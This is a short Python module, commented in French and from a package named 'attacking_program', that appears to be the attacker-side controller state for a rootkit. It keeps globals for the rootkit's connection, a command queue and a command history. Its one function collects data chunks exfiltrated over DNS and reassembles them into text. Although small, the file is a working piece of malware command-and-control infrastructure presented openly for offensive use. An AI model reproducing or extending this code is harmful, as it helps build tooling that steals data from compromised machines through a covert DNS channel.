import time
from attacking_program.config import DNS_RESPONSE_TIMEOUT, DNS_POLL_INTERVAL
import threading

# 🔁 Variables partagées globales
command_queue = []
exfil_buffer = {}
expected_chunks = None
last_channel = 'tcp'
authenticated = False

# 🧠 Historique des commandes
command_history = []

# 🔒 Verrou de connexion
connection_lock = threading.Lock()

# 📡 Connexion actuelle du rootkit
rootkit_connection = None
rootkit_address = None

# ⌨️ Dernière réponse du rootkit
last_response = ""


def assemble_exfil(timeout=DNS_RESPONSE_TIMEOUT, poll=DNS_POLL_INTERVAL):
    """
    Attend jusqu’à `timeout` secondes que tous les chunks DNS arrivent.
    Retourne le texte assemblé, ou chaîne vide si timeout.
    """
    global expected_chunks, exfil_buffer

    start = time.time()

    while True:
        if expected_chunks is not None and len(exfil_buffer) >= expected_chunks:
            break
        if time.time() - start > timeout:
            break
        time.sleep(poll)

    if expected_chunks is not None and len(exfil_buffer) >= expected_chunks:
        data = b''.join(exfil_buffer[i] for i in range(expected_chunks))
        text = data.decode(errors='ignore')
    else:
        text = ""

    expected_chunks = None
    exfil_buffer.clear()
    return text
